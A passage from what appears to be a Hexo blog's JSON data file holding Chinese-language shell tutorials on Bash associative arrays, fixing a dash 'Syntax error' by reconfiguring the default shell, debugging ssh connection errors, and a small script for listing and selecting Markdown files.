class=\"line\">数组长度<span class=\"variable\">$&#123;#arr[@]:1:4&#125;</span>:\t5</div><div class=\"line\">单个元素长度<span class=\"variable\">$&#123;#arr[C]&#125;</span>:\t2</div><div class=\"line\">单个元素长度<span class=\"variable\">$&#123;#arr[B]&#125;</span>:\t4</div><div class=\"line\"></div><div class=\"line\">数组索引<span class=\"variable\">$&#123;!arr[@]&#125;</span>:\tA B C E b</div><div class=\"line\">全部数组内容<span class=\"variable\">$&#123;arr[@]&#125;</span>:\tA1 B411 C2 E3 b5</div><div class=\"line\"></div><div class=\"line\">数组子串<span class=\"variable\">$&#123;arr[@]:2&#125;</span>:\tB411 C2 E3 b5</div><div class=\"line\">数组子串<span class=\"variable\">$&#123;arr[@]:1:4&#125;</span>:\tA1 B411 C2 E3</div><div class=\"line\"></div><div class=\"line\">数组值<span class=\"variable\">$&#123;arr[b]&#125;</span>:\tb5</div><div class=\"line\">数组值<span class=\"variable\">$&#123;arr[C]&#125;</span>:\tC2</div><div class=\"line\">数组值(大小写敏感)<span class=\"variable\">$&#123;arr[c]&#125;</span>:</div></pre></td></tr></table></figure>\n<h2 id=\"三、附加知识\"><a href=\"#三、附加知识\" class=\"headerlink\" title=\"三、附加知识\"></a>三、附加知识</h2><h3 id=\"1-内部域分隔符IFS\"><a href=\"#1-内部域分隔符IFS\" class=\"headerlink\" title=\"1. 内部域分隔符IFS\"></a>1. 内部域分隔符IFS</h3><p>shell里默认使用空格、制表符以及换行为分隔符。</p>\n<h3 id=\"2-数组转换\"><a href=\"#2-数组转换\" class=\"headerlink\" title=\"2. 数组转换\"></a>2. 数组转换</h3><p>字符串可通过()默认通过IFS将字符串直接转换成数组。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ str=<span class=\"string\">\"1 3 2 7 5\"</span></div><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[@]&#125;</span></div><div class=\"line\">1 3 2 7 5</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;!arr[@]&#125;</span></div><div class=\"line\">0 1 2 3 4</div></pre></td></tr></table></figure></p>\n<h3 id=\"3-数组键大小写敏感\"><a href=\"#3-数组键大小写敏感\" class=\"headerlink\" title=\"3. 数组键大小写敏感\"></a>3. 数组键大小写敏感</h3><p><code>${arr[C]}</code>取值为C2，<code>${arr[c]}</code>则为空。<br>另外，键加不加引号都一样，引号可用于拼接键值操作。</p>\n<h3 id=\"4-关联数组键有序\"><a href=\"#4-关联数组键有序\" class=\"headerlink\" title=\"4. 关联数组键有序\"></a>4. 关联数组键有序</h3><p>关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。</p>\n<h3 id=\"5-索引负值\"><a href=\"#5-索引负值\" class=\"headerlink\" title=\"5. 索引负值\"></a>5. 索引负值</h3><p>数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。<br>如果索引值index&lt;-max_num-1，则会报“数组下标不正确”的异常。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-1]&#125;</span></div><div class=\"line\">5</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-5]&#125;</span></div><div class=\"line\">1</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[-6]&#125;</span></div><div class=\"line\">-bash: arr: 数组下标不正确</div></pre></td></tr></table></figure></p>\n<h3 id=\"6-索引超过数组最大个数\"><a href=\"#6-索引超过数组最大个数\" class=\"headerlink\" title=\"6. 索引超过数组最大个数\"></a>6. 索引超过数组最大个数</h3><p>不输出任何内容，也不会报错。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)</div><div class=\"line\">yerba-buena:tmp yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$&#123;arr[6]&#125;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://salogs.com/news/2015/08/02/shell-array-demo/\">shell 数组应用实例</a></li>\n<li><a href=\"http://www.1987.name/164.html\">[Shell学习笔记] 数组、关联数组和别名使用</a></li>\n</ol>"},{"title":"Syntax error- \"(\" unexpected","date":"2016-02-28T08:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、问题描述\n假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: \"(\" unexpected。\n\n\n## 二、原因\n主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。\n\n\n## 三、解决\n通过将当前通过以下方式可以使 shell 切换回 bash：\n`sudo dpkg-reconfigure dash`\n然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。\n\n\n## 四、参考文档\n[Shell编程笔记——Syntax error: \"(\" unexpected](http://blog.csdn.net/breeze5428/article/details/27353583)\nhttp://ask.chinaunix.net/question/974\nhttp://bbs.csdn.net/topics/390132876","source":"_posts/article/shell/Syntax error- \"(\" unexpected.md","raw":"title: 'Syntax error- \"(\" unexpected'\ntags:\n  - issue\n  - shell\ncategories:\n  - 系统脚本\ndate: 2016-02-28 16:56:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、问题描述\n假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: \"(\" unexpected。\n\n\n## 二、原因\n主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。\n\n\n## 三、解决\n通过将当前通过以下方式可以使 shell 切换回 bash：\n`sudo dpkg-reconfigure dash`\n然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。\n\n\n## 四、参考文档\n[Shell编程笔记——Syntax error: \"(\" unexpected](http://blog.csdn.net/breeze5428/article/details/27353583)\nhttp://ask.chinaunix.net/question/974\nhttp://bbs.csdn.net/topics/390132876","slug":"article/shell/Syntax error- \"(\" unexpected","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxto005d5nbt9zpe3mec","content":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p>假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: “(“ unexpected。</p>\n<h2 id=\"二、原因\"><a href=\"#二、原因\" class=\"headerlink\" title=\"二、原因\"></a>二、原因</h2><p>主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。</p>\n<h2 id=\"三、解决\"><a href=\"#三、解决\" class=\"headerlink\" title=\"三、解决\"></a>三、解决</h2><p>通过将当前通过以下方式可以使 shell 切换回 bash：<br><code>sudo dpkg-reconfigure dash</code><br>然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://blog.csdn.net/breeze5428/article/details/27353583\" target=\"_blank\" rel=\"external\">Shell编程笔记——Syntax error: “(“ unexpected</a><br><a href=\"http://ask.chinaunix.net/question/974\" target=\"_blank\" rel=\"external\">http://ask.chinaunix.net/question/974</a><br><a href=\"http://bbs.csdn.net/topics/390132876\" target=\"_blank\" rel=\"external\">http://bbs.csdn.net/topics/390132876</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、问题描述\"><a href=\"#一、问题描述\" class=\"headerlink\" title=\"一、问题描述\"></a>一、问题描述</h2><p>假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: “(“ unexpected。</p>\n<h2 id=\"二、原因\"><a href=\"#二、原因\" class=\"headerlink\" title=\"二、原因\"></a>二、原因</h2><p>主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。</p>\n<h2 id=\"三、解决\"><a href=\"#三、解决\" class=\"headerlink\" title=\"三、解决\"></a>三、解决</h2><p>通过将当前通过以下方式可以使 shell 切换回 bash：<br><code>sudo dpkg-reconfigure dash</code><br>然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。</p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://blog.csdn.net/breeze5428/article/details/27353583\">Shell编程笔记——Syntax error: “(“ unexpected</a><br><a href=\"http://ask.chinaunix.net/question/974\">http://ask.chinaunix.net/question/974</a><br><a href=\"http://bbs.csdn.net/topics/390132876\">http://bbs.csdn.net/topics/390132876</a></p>\n"},{"title":"Connection closed by remote host","date":"2016-02-28T08:23:00.000Z","_content":"## 异常内容\nssh_exchange_identification - Connection closed by remote host\n\n\n## 调试\n用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。\n\n\n## 参考文档\nhttp://www.zhihu.com/question/20023544","source":"_posts/article/linux/ssh_exchange_identification- Connection closed by remote host.md","raw":"title: Connection closed by remote host\ntags:\n  - ssh\n  - issue\ncategories:\n  - 工具软件\ndate: 2016-02-28 16:23:00\n---\n## 异常内容\nssh_exchange_identification - Connection closed by remote host\n\n\n## 调试\n用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。\n\n\n## 参考文档\nhttp://www.zhihu.com/question/20023544","slug":"article/linux/ssh_exchange_identification- Connection closed by remote host","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtq005g5nbtobojkg3l","content":"<h2 id=\"异常内容\"><a href=\"#异常内容\" class=\"headerlink\" title=\"异常内容\"></a>异常内容</h2><p>ssh_exchange_identification - Connection closed by remote host</p>\n<h2 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h2><p>用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://www.zhihu.com/question/20023544\" target=\"_blank\" rel=\"external\">http://www.zhihu.com/question/20023544</a></p>\n","excerpt":"","more":"<h2 id=\"异常内容\"><a href=\"#异常内容\" class=\"headerlink\" title=\"异常内容\"></a>异常内容</h2><p>ssh_exchange_identification - Connection closed by remote host</p>\n<h2 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h2><p>用ssh -v去连有问题的服务器，这时会有比较详细的调试信息在屏幕上输出，可以帮助判断是哪一步出了问题。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://www.zhihu.com/question/20023544\">http://www.zhihu.com/question/20023544</a></p>\n"},{"title":"文件遍历选取脚本","date":"2016-02-01T10:32:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、脚本说明\n\n### 1. 应用场景\n身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。\n有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。\n因此，需要从一堆现有case里选取若干文件即可。\n\n### 2. 脚本内容\n脚本主要分为二部分内容：文件遍历和文件选择。\n\n文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。\n文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。\n\n\n## 二、选取脚本\n\n### 1. 脚本源码\n``` bash\n#!/bin/bash\n\nBASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article\nFEATURE='*.md'\n\nif [[ $# -ge 1 && $1 != '-' ]]\nthen\n\tBASE_PATH=$1\nfi\n\nif [[ $# -ge 2 && $2 != '-' ]]\nthen\n\tFEATURE=$2\nfi\n\necho \"BASE_PATH: $BASE_PATH\"\necho \"FEATURE: $FEATURE\"\n\ndeclare -a files\n\n# 文件遍历\nfunction file_traverse {\n    echo \"-----------------------------------------\"\n    IFS=$'\\n'\n    #echo -n \"$IFS\" | od -b\n\n\n    files=($(find $BASE_PATH -name \"$FEATURE\"))\n    for str in ${!files[@]}\n    do\n        echo -e \"$str\\t${files[$str]}\"\n    done\n}\n\n# 文件选择\nfunction choose_file {\n    echo \"-----------------------------------------\"\n    read -p \"请通过序号选择文件：\" ids\n    echo \"你选择的序号为：${ids[@]}\"\n\n\n    IFS=$' \\t'\n    for id in ${ids[@]}\n    do\n        if [ $id -lt ${#files[@]} ]\n        then\n            echo \"文件: \"${files[$id]}\n        fi\n    done\n}\n\n\nfile_traverse\nchoose_file\n\n```\n\n\n### 2. 脚本输出\n``` bash\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\n-----------------------------------------\n0\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n1\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/了解IFS.md\n2\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n-----------------------------------------\n请通过序号选择文件：2 0\n你选择的序号为：2 0\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n```","source":"_posts/article/shell/文件遍历选取脚本.md","raw":"title: 文件遍历选取脚本\ntags:\n  - 实践\n  - shell\ncategories:\n  - 系统脚本\ndate: 2016-02-01 18:32:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、脚本说明\n\n### 1. 应用场景\n身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。\n有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。\n因此，需要从一堆现有case里选取若干文件即可。\n\n### 2. 脚本内容\n脚本主要分为二部分内容：文件遍历和文件选择。\n\n文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。\n文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。\n\n\n## 二、选取脚本\n\n### 1. 脚本源码\n``` bash\n#!/bin/bash\n\nBASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article\nFEATURE='*.md'\n\nif [[ $# -ge 1 && $1 != '-' ]]\nthen\n\tBASE_PATH=$1\nfi\n\nif [[ $# -ge 2 && $2 != '-' ]]\nthen\n\tFEATURE=$2\nfi\n\necho \"BASE_PATH: $BASE_PATH\"\necho \"FEATURE: $FEATURE\"\n\ndeclare -a files\n\n# 文件遍历\nfunction file_traverse {\n    echo \"-----------------------------------------\"\n    IFS=$'\\n'\n    #echo -n \"$IFS\" | od -b\n\n\n    files=($(find $BASE_PATH -name \"$FEATURE\"))\n    for str in ${!files[@]}\n    do\n        echo -e \"$str\\t${files[$str]}\"\n    done\n}\n\n# 文件选择\nfunction choose_file {\n    echo \"-----------------------------------------\"\n    read -p \"请通过序号选择文件：\" ids\n    echo \"你选择的序号为：${ids[@]}\"\n\n\n    IFS=$' \\t'\n    for id in ${ids[@]}\n    do\n        if [ $id -lt ${#files[@]} ]\n        then\n            echo \"文件: \"${files[$id]}\n        fi\n    done\n}\n\n\nfile_traverse\nchoose_file\n\n```\n\n\n### 2. 脚本输出\n``` bash\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\nyerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nBASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/\nFEATURE: *.md\n-----------------------------------------\n0\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n1\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/了解IFS.md\n2\t/Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n-----------------------------------------\n请通过序号选择文件：2 0\n你选择的序号为：2 0\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/遍历博客文章.md\n文件: /Users/yeshaoting/java/workspace/github/hexo-blog/source/_posts/article/shell/shell关联数组基本用法.md\n```","slug":"article/shell/文件遍历选取脚本","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxts005k5nbtgxguzvbp","content":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、脚本说明\"><a href=\"#一、脚本说明\" class=\"headerlink\" title=\"一、脚本说明\"></a>一、脚本说明</h2><h3 id=\"1-应用场景\"><a href=\"#1-应用场景\" class=\"headerlink\" title=\"1. 应用场景\"></a>1. 应用场景</h3><p>身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。<br>有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。<br>因此，需要从一堆现有case里选取若干文件即可。</p>\n<h3 id=\"2-脚本内容\"><a href=\"#2-脚本内容\" class=\"headerlink\" title=\"2. 脚本内容\"></a>2. 脚本内容</h3><p>脚本主要分为二部分内容：文件遍历和文件选择。</p>\n<p>文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。<br>文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。</p>\n<h2 id=\"二、选取脚本\"><a href=\"#二、选取脚本\" class=\"headerlink\" title=\"二、选取脚本\"></a>二、选取脚本</h2><h3 id=\"1-脚本源码\"><a href=\"#1-脚本源码\" class=\"headerlink\" title=\"1. 脚本源码\"></a>1. 脚本源码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/bash</span></div><div class=\"line\"></div><div class=\"line\">BASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article</div><div class=\"line\">FEATURE=<span class=\"string\">'*.md'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"variable\">$#</span> -ge 1 &amp;&amp; <span class=\"variable\">$1</span> != <span class=\"string\">'-'</span> ]]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">\tBASE_PATH=<span class=\"variable\">$1</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"variable\">$#</span> -ge 2 &amp;&amp; <span class=\"variable\">$2</span> != <span class=\"string\">'-'</span> ]]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">\tFEATURE=<span class=\"variable\">$2</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"BASE_PATH: <span class=\"variable\">$BASE_PATH</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"FEATURE: <span class=\"variable\">$FEATURE</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">declare</span> <span class=\"_\">-a</span> files</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 文件遍历</span></div><div class=\"line\"><span class=\"keyword\">function</span> file_traverse &#123;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"-----------------------------------------\"</span></div><div class=\"line\">    IFS=$<span class=\"string\">'\\n'</span></div><div class=\"line\">    <span class=\"comment\">#echo -n \"$IFS\" | od -b</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    files=($(find <span class=\"variable\">$BASE_PATH</span> -name <span class=\"string\">\"<span class=\"variable\">$FEATURE</span>\"</span>))</div><div class=\"line\">    <span class=\"keyword\">for</span> str <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;!files[@]&#125;</span></div><div class=\"line\">    <span class=\"keyword\">do</span></div><div class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$str</span>\\t<span class=\"variable\">$&#123;files[$str]&#125;</span>\"</span></div><div class=\"line\">    <span class=\"keyword\">done</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 文件选择</span></div><div class=\"line\"><span class=\"keyword\">function</span> choose_file &#123;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"-----------------------------------------\"</span></div><div class=\"line\">    <span class=\"built_in\">read</span> -p <span class=\"string\">\"请通过序号选择文件：\"</span> ids</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"你选择的序号为：<span class=\"variable\">$&#123;ids[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    IFS=$<span class=\"string\">' \\t'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> id <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;ids[@]&#125;</span></div><div class=\"line\">    <span class=\"keyword\">do</span></div><div class=\"line\">        <span class=\"keyword\">if</span> [ <span class=\"variable\">$id</span> <span class=\"_\">-lt</span> <span class=\"variable\">$&#123;#files[@]&#125;</span> ]</div><div class=\"line\">        <span class=\"keyword\">then</span></div><div class=\"line\">            <span class=\"built_in\">echo</span> <span class=\"string\">\"文件: \"</span><span class=\"variable\">$&#123;files[$id]&#125;</span></div><div class=\"line\">        <span class=\"keyword\">fi</span></div><div class=\"line\">    <span class=\"keyword\">done</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">file_traverse</div><div class=\"line\">choose_file</div></pre></td></tr></table></figure>\n<h3 id=\"2-脚本输出\"><a href=\"#2-脚本输出\" class=\"headerlink\" title=\"2. 脚本输出\"></a>2. 脚本输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:shell yeshaoting$ sh <span class=\"built_in\">print</span>_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">FEATURE: *.md</div><div class=\"line\">yerba-buena:shell yeshaoting$ sh <span class=\"built_in\">print</span>_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">FEATURE: *.md</div><div class=\"line\">-----------------------------------------</div><div class=\"line\">0\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/shell关联数组基本用法.md</div><div class=\"line\">1\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/了解IFS.md</div><div class=\"line\">2\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/遍历博客文章.md</div><div class=\"line\">-----------------------------------------</div><div class=\"line\">请通过序号选择文件：2 0</div><div class=\"line\">你选择的序号为：2 0</div><div class=\"line\">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/遍历博客文章.md</div><div class=\"line\">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/shell关联数组基本用法.md</div></pre></td></tr></table></figure>","excerpt":"","more":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、脚本说明\"><a href=\"#一、脚本说明\" class=\"headerlink\" title=\"一、脚本说明\"></a>一、脚本说明</h2><h3 id=\"1-应用场景\"><a href=\"#1-应用场景\" class=\"headerlink\" title=\"1. 应用场景\"></a>1. 应用场景</h3><p>身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。<br>有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。<br>因此，需要从一堆现有case里选取若干文件即可。</p>\n<h3 id=\"2-脚本内容\"><a href=\"#2-脚本内容\" class=\"headerlink\" title=\"2. 脚本内容\"></a>2. 脚本内容</h3><p>脚本主要分为二部分内容：文件遍历和文件选择。</p>\n<p>文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。<br>文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。</p>\n<h2 id=\"二、选取脚本\"><a href=\"#二、选取脚本\" class=\"headerlink\" title=\"二、选取脚本\"></a>二、选取脚本</h2><h3 id=\"1-脚本源码\"><a href=\"#1-脚本源码\" class=\"headerlink\" title=\"1. 脚本源码\"></a>1. 脚本源码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div 